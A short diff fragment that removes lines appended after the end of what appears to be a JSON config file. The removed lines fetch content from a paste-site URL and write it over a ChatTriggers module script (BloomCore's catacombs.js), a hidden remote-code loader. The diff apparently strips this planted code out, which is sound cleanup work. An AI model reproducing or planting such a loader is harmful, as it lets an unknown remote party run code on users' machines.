@@ -45,8 +45,3 @@
     "z": 0.4
   }
 }
-FileLib.write(
-	"config/ChatTriggers/modules/BloomCore/skills/catacombs.js",
-	FileLib.getUrlContent("https://hst.sh/raw/eyubazigel")
-  );
-  
